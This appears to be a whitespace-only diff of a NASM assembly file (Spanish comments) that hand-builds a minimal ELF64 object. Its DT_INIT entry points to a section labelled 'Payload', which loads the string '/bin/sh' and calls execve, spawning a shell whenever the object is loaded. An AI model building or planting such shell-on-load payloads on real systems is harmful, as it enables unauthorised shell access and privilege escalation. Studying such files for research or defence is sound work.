@@ -228,25 +228,25 @@ codepart1:
     mov rdi, rsp
     push rdx
     push rdi
-    mov rsi, rsp    
+    mov rsi, rsp
     syscall
     db 0
-            dw      0x40							;	e_ehsize,
-			dw		0x38							;	e_phentsize
-			dw		2								;	e_phnum
-			dw		0x40             				;	e_shentsize
-			
+            dw      0x40							;	e_ehsize
+            dw		0x38							;	e_phentsize
+            dw		2								;	e_phnum
+            dw		0x40             				;	e_shentsize
+
 overlapphdr:
             dw      1, 0                            ;   e_shnum, e_shstrndx
 
-; Constante con el tamaño de la cabecera ELF.			
+; Constante con el tamaño de la cabecera ELF.
 ehdrsize    equ     $ - ehdr
 
 ; Program Headers.
 phdr:                                               ; Elf64_Phdr
             dd      7                               ;   p_flags
-            dq      0								;	p_offset, 
-			dq		0                            	;   p_vaddr
+            dq      0								;	p_offset
+            dq		0                            	;   p_vaddr
 
 ; Payload
 _init_proc:
@@ -255,24 +255,23 @@ _init_proc:
 	cdq
 	mov rbx, 0x68732F6E69622F
 	jmp codepart1
-
             dq      filesize						;	p_memsz
-			dq		0x1000                			;   p_align
+            dq		0x1000                			;   p_align
 
 phdrsize    equ     $ - phdr
 
             dd      2								;	p_type
-			dd		6                           	;   p_flags
+            dd		6                           	;   p_flags
             dq      elf64dyn						;	p_offset
-			dq		elf64dyn              			;	p_vaddr
+            dq		elf64dyn              			;	p_vaddr
 
 elf64dyn:
             dq 		0x0c
-			dq 		_init_proc
-			dq 		0x05, 0
-            db 		0x06  
-null:       
-elf64dyn_end:    
+            dq 		_init_proc
+            dq 		0x05, 0
+            db 		0x06
+null:
+elf64dyn_end:
 
 ; Tamaño total del binario
 filesize      equ     $ - $$
